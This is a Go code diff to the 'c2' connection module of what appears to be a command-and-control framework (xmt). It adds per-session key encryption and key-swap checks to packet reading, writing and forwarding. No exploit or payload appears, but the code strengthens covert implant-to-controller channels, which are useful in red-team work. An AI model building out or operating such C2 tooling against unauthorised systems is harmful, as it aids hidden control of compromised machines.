@@ -10,6 +10,7 @@ import (
 
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
@@ -25,8 +26,7 @@ var ErrMalformedPacket = xerr.Sub("empty or nil Packet", 0x17)
 var _ connHost = (*Session)(nil)
 
 type conn struct {
-	// key  *[32]byte
-	// NOTE(dij) ^ for upcoming key update
+	key  *data.Key
 	host connHost
 	next *com.Packet
 	subs map[uint32]bool
@@ -35,6 +35,7 @@ type conn struct {
 }
 type connHost interface {
 	chanWake()
+	keyCheck()
 	name() string
 	update(string)
 	chanWakeClear()
@@ -43,6 +44,7 @@ type connHost interface {
 	chanStart() bool
 	stateUnset(uint32)
 	chanRunning() bool
+	keyValue() *data.Key
 	clientID() device.ID
 	next(bool) *com.Packet
 	deadlineRead() time.Time
@@ -157,6 +159,7 @@ func handle(l *cout.Log, c net.Conn, h connServer, a string) {
 		if cout.Enabled {
 			l.Debug("[%s:%s] %s: Received an Oneshot Packet.", h.prefix(), n.Device, a)
 		}
+		// KeyCrypt: Should NOT be encrypted here.
 		if err = h.notify(nil, n); err != nil {
 			if cout.Enabled {
 				l.Warning("[%s:%s] %s: Error processing Oneshot: %s!", h.prefix(), n.Device, a, err)
@@ -167,6 +170,7 @@ func handle(l *cout.Log, c net.Conn, h connServer, a string) {
 	if cout.Enabled {
 		l.Debug("[%s:%s] %s: Received Packet %q (non-channel).", h.prefix(), n.Device, a, n)
 	}
+	// KeyCrypt: Packet 'n' is decrypted here.
 	v, err := h.talk(a, n)
 	if err != nil {
 		if c.Close(); cout.Enabled {
@@ -174,7 +178,8 @@ func handle(l *cout.Log, c net.Conn, h connServer, a string) {
 		}
 		return
 	}
-	// TODO(dij): Con should have non-first packet here (encrypt)
+	// KeyCrypt: Crypt next outgoing Packet.
+	v.next.Crypt(v.key)
 	if err := writePacket(c, h.wrapper(), h.transform(), v.next); err != nil {
 		if c.Close(); cout.Enabled {
 			l.Error("[%s:%s] %s: Error writing Packet: %s!", h.prefix(), v.next.Device, a, err)
@@ -224,7 +229,8 @@ func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
 			}
 			break
 		}
-		if cout.Enabled {
+		// KeyCrypt: Decrypt incoming Packet here.
+		if n.Crypt(c.key); cout.Enabled {
 			l.Debug("[%s:%s:S->C:R] %s: Received a Packet %q.", h.prefix(), c.host.name(), a, n)
 		}
 		if err = c.resolve(l, c.host, h, a, n.Tags, true); err != nil {
@@ -233,7 +239,6 @@ func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
 			}
 			break
 		}
-		// TODO(dij): Decrypt here with con key
 		if err = c.process(l, h, a, n, true); err != nil {
 			if cout.Enabled {
 				l.Error("[%s:%s:S->C:R] %s: Error processing Packet data: %s!", h.prefix(), c.host.name(), a, err)
@@ -273,10 +278,12 @@ func (c *conn) channelWrite(l *cout.Log, h connServer, a string, x net.Conn) {
 		if c.host.chanStop() {
 			n.Flags |= com.FlagChannelEnd
 		}
-		if cout.Enabled {
+		// KeyCrypt: Encrypt outgoing Packet.
+		if n.Crypt(c.key); cout.Enabled {
 			l.Debug("[%s:%s:S->C:W] %s: Sending Packet %q.", h.prefix(), c.host.name(), a, n)
 		}
-		// TODO(dij): Encrypt here with conn key
+		// KeyCrypt: "next" was called, check for a Key Swap.
+		c.host.keyCheck()
 		if err := writePacket(x, h.wrapper(), h.transform(), n); err != nil {
 			if n.Clear(); cout.Enabled {
 				if errors.Is(err, net.ErrClosed) {
@@ -370,13 +377,17 @@ func (c *conn) processSingle(l *cout.Log, h connServer, a string, n *com.Packet,
 	if len(c.add) > 0 {
 		c.next = &com.Packet{Flags: com.FlagMulti | com.FlagMultiDevice, Device: c.host.clientID()}
 		if v != nil {
+			// KeyCrypt: Encrypt packet before packing.
+			v.Crypt(c.key)
 			err := writeUnpack(c.next, v, true, true)
 			if v = nil; err != nil {
 				if cout.Enabled {
 					l.Error("[%s:%s] %s: Error packing Packet response: %s!", h.prefix(), c.host.name(), a, err)
 				}
 			}
-			return err
+			// KeyCrypt: "next" was called (result was non-nil), check for a Key Swap.
+			c.host.keyCheck()
+			return nil
 		}
 		return nil
 	}
@@ -437,6 +448,8 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 			continue
 		}
 		if c.host.clientID() == v.Device {
+			// KeyCrypt: Decrypt packet for us here.
+			v.Crypt(c.key)
 			if err := h.notify(c.host, v); err != nil {
 				if cout.Enabled {
 					l.Warning("[%s:%s/M] %s: Error processing Packet: %s!", h.prefix(), v.Device, a, err)
@@ -445,17 +458,24 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 			if o {
 				continue
 			}
-			var (
-				z   = c.host.next(false)
-				err = writeUnpack(c.next, z, true, true)
-			)
+			// KeyCrypt: Don't call next until the end of the loop, as there may
+			//           be packets encrypted with the old key still in queue.
+			z := c.host.next(false)
+			// KeyCrypt: Encrypt next Packet. If this happens to be a rekey,
+			//           it will pass before and affect all after with the new key
+			//           This seems really buggy, but since it happens ONLY on the
+			//           Server/Proxy end, it should be ok. BUG(dij): for marking
+			//           just in case ^_^.
+			z.Crypt(c.key)
+			err := writeUnpack(c.next, z, true, true)
 			if z = nil; err != nil {
 				if c.next.Clear(); cout.Enabled {
 					l.Error("[%s:%s/M] %s: Error packing Packet response: %s!", h.prefix(), v.Device, a, err)
 				}
 			}
-			return err
+			continue
 		}
+		// KeyCrypt: Packet "r" is already encrypted here.
 		k, q, r, err := h.talkSub(a, v, o)
 		if err != nil {
 			if c.next.Clear(); cout.Enabled {
@@ -477,6 +497,8 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 			return err
 		}
 	}
+	// KeyCrypt: "next" was called, check for a Key Swap.
+	c.host.keyCheck()
 	n.Clear()
 	return nil
 }
@@ -523,7 +545,13 @@ func (c *conn) resolve(l *cout.Log, s connHost, h connServer, a string, t []uint
 			continue
 		}
 		if n := v.next(true); n != nil {
+			// KeyCrypt: Encrypt this new Packet.
+			n.Crypt(v.keyValue())
 			c.add = append(c.add, n)
+			// KeyCrypt: "next" was called, check for a Key Swap.
+			//           This is a tag, which is server side only, so I doubt
+			//           a swap will happen here. BUG(dij): Tag incase also ^_^.
+			v.keyCheck()
 		}
 	}
 	if !o {
